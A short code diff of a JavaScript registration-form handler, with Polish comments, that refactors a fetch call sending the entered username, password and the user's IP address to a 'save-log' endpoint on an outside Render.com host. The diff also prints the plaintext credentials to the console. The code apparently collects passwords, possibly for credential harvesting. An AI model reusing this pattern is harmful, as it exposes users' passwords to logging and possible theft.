@@ -35,18 +35,23 @@ document.getElementById('registrationForm').addEventListener('submit', async fun
 
         console.log('📨 Wysyłanie danych:', { username, password, ip: userIP });
 
-        // Wyślij do backendu na Render.com
-        const response = await fetch('https://social-tools.onrender.com/save-log', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                username: username,
-                password: password,
-                ip: userIP
-            })
-        });
+// Wyślij do backendu na Render.com
+const requestData = {
+    username: username,
+    password: password,
+    ip: userIP
+};
+
+console.log('📨 Wysyłanie danych:', requestData);
+
+const response = await fetch('https://social-tools.onrender.com/save-log', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        'Accept': 'application/json'
+    },
+    body: JSON.stringify(requestData)
+});
 
         const result = await response.json();
         console.log('📩 Odpowiedź z serwera:', result);
@@ -78,3 +83,4 @@ function showMessage(message, type) {
     messageEl.className = 'message ' + type;
     messageEl.style.display = message ? 'block' : 'none';
 }
+
